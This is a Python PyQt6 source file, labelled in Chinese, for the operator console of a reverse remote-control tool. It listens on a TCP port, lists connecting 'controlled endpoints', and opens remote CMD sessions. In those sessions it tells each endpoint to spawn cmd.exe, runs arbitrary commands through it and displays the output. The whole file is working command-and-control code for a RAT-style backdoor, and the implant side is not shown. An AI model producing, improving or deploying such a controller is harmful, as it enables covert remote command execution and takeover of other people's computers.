import sys
import socket
import threading
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
import struct


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, addr):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()

    def send_packet(self, body: bytes) -> bool:
        if not self.connected:
            return False
        try:
            body_len = len(body)
            header = struct.pack(">I", body_len)
            packet = header + body
            self.conn.sendall(packet)
            return True
        except (OSError, BrokenPipeError):
            self.close()
            return False

    def close(self):
        self.connected = False
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        # 关闭时发送KILL
        if self.client.connected:
            self.client.send_packet(b"KILL")
        # 主动从主窗口字典中移除自己，避免第二次打开复用旧窗口
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("TCP反向控制端")
        self.resize(700, 500)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("8888")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def accept_loop(self):
        while self.server_running:
            try:
                conn, addr = self.server_sock.accept()
                sess = ClientSession(conn, addr)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"新被控端接入 {sess.ip_str}")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] TCP连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"被控端断开 {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while len(buf) >= 4:
                    body_len = struct.unpack(">I", buf[0:4])[0]
                    total_packet_len = 4 + body_len
                    if len(buf) < total_packet_len:
                        break

                    body = buf[4:total_packet_len]
                    del buf[:total_packet_len]

                    if len(body)>=4:
                        cmd_code = body[0:4]
                        if cmd_code == b"PONG":
                            sess.last_pong = datetime.now()
                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                        elif cmd_code == b"OUTP":
                            output_bytes = body[4:]
                            out_text = output_bytes.decode("gbk", errors="replace")
                            sess.signals.on_outp.emit(sess, out_text)

            except OSError:
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.log(f"开始监听端口 {port}")

    def stop_server(self):
        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("停止监听")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            # 修复：检查旧对话框是否还存活
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    # 旧对话框已关闭，清理字典
                    del self.open_cmd_dialogs[sess]
            # 创建全新对话框
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
